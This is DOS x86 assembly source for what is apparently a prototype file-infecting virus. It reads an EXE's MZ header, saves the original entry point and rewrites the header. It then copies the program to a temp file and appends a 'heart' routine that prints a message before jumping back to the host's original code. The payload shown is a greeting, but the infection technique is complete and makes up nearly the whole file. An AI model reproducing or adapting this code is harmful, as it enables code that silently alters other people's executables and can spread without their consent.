;-------------------------------------------------------------------------
; This is my heart.
;-------------------------------------------------------------------------
INCLUDE symbols.inc
INCLUDE struct.inc
INCLUDE macroes.inc
;-------------------------------------------------------------------------
IF DEBUG EQ 1
%OUT Debug mode on
ELSE
%OUT Release mode on
ENDIF

;-------------------------------------------------------------------------

stack           SEGMENT BYTE    STACK   'STACK'
                DB      100 DUP('A')
stack           ENDS

;-------------------------------------------------------------------------
_heartcode      SEGMENT PARA
_heartstart     PROC    FAR
_frontheart     LABEL   BYTE
_startheart     LABEL   BYTE
                jmp     _afterheartgreeting
_heartgreeting  DB      0dh,0ah
                DB      'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿',0dh,0ah
                DB      '³  Can you see what I see? Can you feel what I feel?  ³ ',0dh,0ah
                DB      'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ',0dh,0ah,'$'
_oldInitCS      DW      0
_oldInitIP      DW      0
_newInitCS      DW      0
_newInitIP      DW      0
_realheartIP    DW      0
_afterheartgreeting:
                push    ds
                push    cs
                pop     ds                      ; change DS to same as CS
                ShowMSG _heartgreeting
                pop     ds
comment %
                mov     ah,4ch
                mov     al,0ffh
                int     21h
        %
                push    cs
                pop     ax
                sub     ax,_newInitCS
                add     ax,_oldInitCS
                push    ax                      ; store CS in stack
                mov     ax,_oldInitIP
                push    ax                      ; store IP in stack
                ret

_endheart       LABEL   BYTE
                ret
_heartstart     ENDP
_heartcode      ENDS
;-------------------------------------------------------------------------
_code           SEGMENT
                ASSUME  cs:_code,ds:_code,ss:stack
_start          PROC    FAR
                Preparation
                push    cs
                pop     ds
                jmp     _code_start
_fitfilename    DB      '*.___',00h
_filename       DB      12 DUP('A'),0dh,0ah,'$'
_tempFile       DB      '$$$$$$$$.$$$',00h

_searcherr      DB      'No file found.',0dh,0ah,'$'
_fopenerr       DB      'File open error.',0dh,0ah,'$'
_freaderr       DB      'File read error.',0dh,0ah,'$'
_filenotexeerr  DB      'File not exe.',0dh,0ah,'$'
_fcreateerr     DB      'File create error.',0dh,0ah,'$'
_writeerror     DB      'File write error.',0dh,0ah,'$'
_filecloseerr   DB      'File close error.',0dh,0ah,'$'
_fseekerr       DB      'File seek error.',0dh,0ah,'$'
                DB      'HEAD'
_exHeader       exehead <,,,,,,,,,,,,,>       
_Old_SP         DW      0
_SegmentPSP     DW      0
_Handler_Source DW      0
_Handler_Temp   DW      0
_buffer_r       DB      0
_buffer_d       DD      0
_currpos        DW      0
_reloctabsize   DW      0
_counter        DW      0
_heartsize      DW      0
_filesize       DD      0
_remain         DW      0
_Buffer         DB      1024 dup (0)

_code_start:
                mov     ax,OFFSET _endheart
                mov     bx,OFFSET _frontheart
                sub     ax,bx
                mov     _heartsize,ax                   ; work out heart size
                                                        ; no use now                        
                mov     _old_sp,sp
                ;
                ReadEXEHEAD                             ; read in the exehead
                cmp     _exHeader.exSignature,5a4dh
                jne     _fnotexe

                mov     ax,_heartcode
                mov     es,ax
                mov     bx,_exHeader.exInitCS
                mov     es:_oldInitCS,bx
                mov     bx,_exHeader.exInitIP
                mov     es:_oldInitIP,bx                ; store old CS:IP in
                                                        ; heart
                GetFileSize
                SetNewStart
                mov     ax,_exHeader.exInitIP
                mov     _remain,ax
                
                mov     ax,_heartcode
                mov     es,ax
                mov     bx,_exHeader.exInitCS
                mov     es:_newInitCS,bx
                mov     bx,_exHeader.exInitIP
                mov     es:_newInitIP,bx

                mov     ax,_heartsize
                add     WORD PTR _filesize,ax
                jnc     _nocf
                inc     WORD PTR _filesize[2]           ; workout filesize
                                                        ; after pluged in heart
_nocf:

                IF DEBUG EQ 1
                ShowMSG  _filename
                ENDIF

                mov     dx,WORD PTR _filesize[2]
                mov     ax,WORD PTR _filesize
                mov     cx,512
                div     cx
                mov     _exHeader.exPages,ax
                mov     _exHeader.exExtraByte,dx
                cmp     dx,0
                je      _noremain
                inc     _exHeader.exPages
_noremain:
                mov     bx,_SegmentPSP
                CreateFile _tempFile, _Handler_Temp
                jc      _end_
                mov     _exHeader.exInitIP,0
                inc     _exHeader.exInitCS
                WriteFile _Handler_Temp,_exHeader,28    ; Write New Header


                mov     di,_exHeader.exHeaderSize
                mov     cl,4
                sal     di,cl
                sub     di,28
                mov     _reloctabsize,di
                mov     si,28
                SeekFile _Handler_Source,si,FROMTOP
                SeekFile _Handler_Temp,0,FROMTAIL
_headeragain:
                ReadFile _Handler_Source,_buffer,SIZE _buffer
                mov     si,ax                   ; num of byte read stored in AX
                cmp     _reloctabsize,si
                jg      _noenough
                WriteFile _Handler_Temp,_buffer,_reloctabsize
                jmp     _afterwritetab
_noenough:
                WriteFile _Handler_Temp,_buffer,si
                sub     _reloctabsize,si
                jmp     _headeragain
_afterwritetab:                                  ; write new table

                SeekFile _Handler_Temp,0,FROMTAIL
                xor     cx,cx
                mov     di,_exHeader.exHeaderSize
                mov     cl,4
                sal     di,cl
                sub     di,28
                mov     _reloctabsize,di
                mov     si,29
                SeekFile _Handler_Source,si,FROMTOP
                SeekFile _Handler_Temp,0,FROMTAIL

                mov     si,_exHeader.exHeaderSize
                mov     cl,4
                sal     si,cl                   ; set ax to begin of code area
                SeekFile _Handler_Source,si,FROMTOP
                SeekFile _Handler_Temp,0,FROMTAIL

_nextK:
                ReadFile _Handler_Source,_buffer,SIZE _buffer
                mov     si,ax
                WriteFile _Handler_Temp,_buffer,si
                cmp     si,SIZE _buffer
                jb      _aftercopybody
                jmp     _nextK                  ; write source code
_aftercopybody:
                SeekFile _Handler_Temp,0,FROMTAIL
                mov     ax,16
                sub     ax,_remain
                mov     di,ax
                WriteFile _Handler_Temp,_buffer,di      ; supplementary

                SeekFile _Handler_Temp,0,FROMTAIL
                ; WriteHeart
                clc
                mov     ah, 40h
                mov     bx, _Handler_Temp
                mov     cx, _heartsize
                push    ds
                mov     bp,_heartcode
                mov     ds,bp
                lea     dx, _frontheart
                int     21h                     ; write heart
                jc      _writeerror1
                jmp     _afterwrite1
_writeerror1:
                ;SHOWMSG _writeerror
                stc
_afterwrite1:
                ;WriteFile _Handler_Temp,_frontheart,_heartsize
                pop     ds

                CloseFile _Handler_Temp
                CloseFile _Handler_Source
                jmp     _end_

_fnotexe:
                jmp     _end_
_end_:
                mov     _currpos,$
                ret
_start          ENDP
_code           ENDS
                END     _start

